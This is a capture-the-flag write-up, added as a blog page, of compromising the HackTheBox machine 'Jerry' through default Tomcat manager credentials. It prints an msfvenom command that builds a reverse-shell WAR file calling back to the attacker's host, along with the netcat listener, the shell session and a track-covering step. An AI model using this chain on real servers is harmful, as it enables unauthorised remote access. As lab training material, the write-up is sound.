@@ -1,0 +1,88 @@
+{% include 'header.html' %}
+
+<div class="date">09/09-2018</div>
+
+<h2>HackTheBox: jerry by mrh4sh</h2>
+
+<p>As usual, we'll start off by scanning the machine.</p>
+<pre class="code"><span class="host">root@kali:~# </span>nmap -sV -sC -Pn 10.10.10.95
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-12 06:10 EDT
+Nmap scan report for 10.10.10.95
+Host is up (0.041s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 23.28 seconds
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 18.35 seconds
+</pre>
+<p>Tomcat 7.0.88 is open on port 8080. Going to http://10.10.10.95:8080, returns the default Apache Tomcat startpage.</p>
+<img class="img" src="/static/images/htb-jerry/tomcat_default.png" alt="Tomcat default" width=95%>
+<p>Let's scan the /manager/html for default logins through the metasploit framework. (Yes, I'm aware that it's also displayed on the 401 unauthorized access site)</p>
+<pre class="code"><span class="host">root@kali:~# </span>msfconsole
+</pre>
+<pre class="code">msf > use auxiliary/scanner/http/tomcat_mgr_login
+</pre>
+<pre class="code">msf auxiliary(<span class="host">scanner/http/tomcat_mgr_login</span>) > set rhosts 10.10.10.95
+msf auxiliary(<span class="host">scanner/http/tomcat_mgr_login</span>) > run
+</pre>
+<p>The auxiliary returns as positive, for a single default login. tomcat:s3cret.</p>
+
+<img class="img" src="/static/images/htb-jerry/tomcat_login_scanner.png" alt="Tomcat default login">
+
+<p>This login gives us access to Tomcat Web Application Manager on http://10.10.10.95:8080/manager/html. and allows us to deploy .war files. Or even better, a malicious .war backdoor file. ˙ ͜ʟ˙</p>
+<p>Let's try out with a .war backdoor first. I'll use msfvenom to create the payload, and output it to the Desktop.</p>
+
+<pre class="code"><span class="host">root@kali:~# </span>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=4444 -f war > reverse.war
+Payload size: 1085 bytes
+Final size of war file: 1085 bytes
+</pre>
+
+<p>There are multiple ways to do this. Another way is through metasploit. However, it's more fun doing it manually ;-). Let's upload the backdoor through the Web Application Manager and listen to anything on port 4444 with netcat. </p>
+
+<img class="img" src="/static/images/htb-jerry/reverse_war.png" alt="Backdoor war">
+
+<pre class="code"><span class="host">root@kali:~# </span>nc -lvp 4444
+listening on [any] 4444 ...
+</pre>
+
+<p>The backdoor is now displayed as a running application.</p>
+<img class="img" src="/static/images/htb-jerry/reverse_war_running.png" alt="Backdoor war running">
+
+<p>When entering http://10.10.10.95:8080/reverse/, the reverse shell opens in netcat.</p>
+
+<pre class="code"><span class="host">root@kali:~# </span>nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.95: inverse host lookup failed: Unknown host
+connect to [10.10.14.32] from (UNKNOWN) [10.10.10.95] 49208
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>
+</pre>
+
+<p>After the reverse shell opening, we can delete our malicious .war backdoor to (somewhat) cover our tracks, and keep the connection open.</p>
+
+<p>After searching for a bit, I found a file located in C:\Users\Administrator\Desktop\flags called "2 for the price of one.txt". Displaying the contents gives us both user and root flag.</p>
+<pre class="code">
+C:\apache-tomcat-7.0.88>
+C:\apache-tomcat-7.0.88>cd \Users\Administrator\Desktop\flags
+cd \Users\Administrator\Desktop\flags
+
+C:\Users\Administrator\Desktop\flags>type *
+type *
+user.txt
+7004dbcef0f854e0fb401875f26XXXXX
+
+root.txt
+04a8b36e1545a455393d067e772XXXXX
+C:\Users\Administrator\Desktop\flags>
+</pre>
+<p>This box got critisized for it's easiness, unstableness and non existing privilige escalation. I found it enjoyable and fun to do. I learned from it, which is what I care for.</p>
+
+{% include 'footer.html' %}
